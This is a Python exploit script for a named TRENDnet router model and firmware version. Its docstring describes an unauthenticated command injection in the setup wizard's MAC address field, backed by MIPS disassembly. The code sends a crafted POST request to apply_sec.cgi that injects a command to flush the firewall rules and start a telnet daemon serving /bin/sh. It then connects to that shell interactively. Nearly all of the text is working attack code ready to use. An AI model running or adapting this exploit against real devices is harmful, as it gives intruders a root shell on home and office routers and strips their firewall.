#!/usr/bin/python3
"""
This script exercises an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality. Within the setup wizard there is a command
injection processing the MAC address after setting DHCP WAN parameters. The vulnerable disassembly is shown below.

LOAD:0043EE30                 addiu   $a0, $v0, (aCameoWanWanMac - 0x4C0000)  # "cameo.wan.wan_mac"
LOAD:0043EE34                 la      $v0, safe_getenv
LOAD:0043EE38                 nop
LOAD:0043EE3C                 move    $t9, $v0
LOAD:0043EE40                 bal     safe_getenv
LOAD:0043EE44                 nop
LOAD:0043EE48                 lw      $gp, 0x128+saved_gp($fp)
LOAD:0043EE4C                 sw      $v0, 0x128+var_10C($fp)
LOAD:0043EE50                 lw      $v0, 0x128+arg_0($fp)
LOAD:0043EE54                 nop
LOAD:0043EE58                 beqz    $v0, loc_43EEBC
...
LOAD:0043EEBC                 la      $v0, aIdge       # "idge"
LOAD:0043EEC0                 nop
LOAD:0043EEC4                 addiu   $v0, (aUciSetNetworkW_5 - 0x4D0000)  # "uci set network.wan.macaddr=%s"
LOAD:0043EEC8                 addiu   $v1, $fp, 0x128+var_108
LOAD:0043EECC                 move    $a0, $v1         # s
LOAD:0043EED0                 move    $a1, $v0         # format
LOAD:0043EED4                 lw      $a2, 0x128+var_10C($fp)
LOAD:0043EED8                 la      $v0, sprintf
LOAD:0043EEDC                 nop
LOAD:0043EEE0                 move    $t9, $v0
LOAD:0043EEE4                 jalr    $t9 ; sprintf
LOAD:0043EEE8                 nop
LOAD:0043EEEC                 lw      $gp, 0x128+saved_gp($fp)
LOAD:0043EEF0                 addiu   $v0, $fp, 0x128+var_108
LOAD:0043EEF4                 move    $a0, $v0         # command
LOAD:0043EEF8                 la      $v0, _system
LOAD:0043EEFC                 nop
LOAD:0043EF00                 move    $t9, $v0
LOAD:0043EF04                 jalr    $t9 ; _system
LOAD:0043EF08                 nop
LOAD:0043EEEC                 lw      $gp, 0x128+saved_gp($fp)
LOAD:0043EEF0                 addiu   $v0, $fp, 0x128+var_108
LOAD:0043EEF4                 move    $a0, $v0         # command
LOAD:0043EEF8                 la      $v0, _system
LOAD:0043EEFC                 nop
LOAD:0043EF00                 move    $t9, $v0
LOAD:0043EF04                 jalr    $t9 ; _system

The packet is generated using the Mips Overflow Writer from https://github.com/fuzzywalls/mow
"""
import mow
import time
import argparse
import telnetlib


def telnet_connect(host, port):
    """
    Connect to telnet server.

    :param host: Telnet server IP.
    :type host: str

    :param port: Telnet server listening port.
    :type port: int

    :return: Telnet session or None
    """
    try:
        return telnetlib.Telnet(host, port, 0.1)
    except:
        return None


def generate_exploit(host, port, command):
    """
    Generate packet to exploit the target.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param command: Command to execute upon successful exploitation.
    :type command: str

    :return: Packet to send to the target.
    :rtype: bytes
    """
    command = b'`' + bytes(command.replace(' ', '${IFS}'), 'utf8') + b'`'
    data = {b'ccp_act': b'set',
            b'action': b'wizard_wan',
            b'cameo.wan.wan_proto': b'dhcpc',
            b'cameo.wan.wan_mac': command}

    data = b'&'.join(b'%s=%s' % (key, value) for key,value in data.items())
    request = mow.CustomRequest(host, port, mow.POST, b'apply_sec.cgi', data=data)
    packet = request.create_packet()
    return packet


def exploit_target(host, port, telnet_port):
    """
    Repeatedly attempt to exploit the target until a reverse shell is established.

    :param host: IP address of the target.
    :type host: str

    :param port: Listening port of the target.
    :type port: int

    :param telnet_port: Port to open to establish the telnet connection.
    :type telnet_port: int
    """
    telnet_command = 'iptables -F|telnetd -l /bin/sh -p %d' % telnet_port
    packet = generate_exploit(host, port, telnet_command)

    mow.send_packet(host, port, packet)

    time.sleep(3)
    tn = telnet_connect(host, telnet_port)

    tn.interact()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Unauthenticated command injection processing MAC address during the '
                                                 'DHCP setup wizard in the TRENDNet TEW-827DRU.')

    parser.add_argument('-i', '--ip', help='Target IP address', required=True)
    parser.add_argument('-p', '--port', help='Target port.', type=int, default=80)
    parser.add_argument('-t', '--tport', help='Telnet port to connect to on successful exploitation.', type=int)

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.tport)
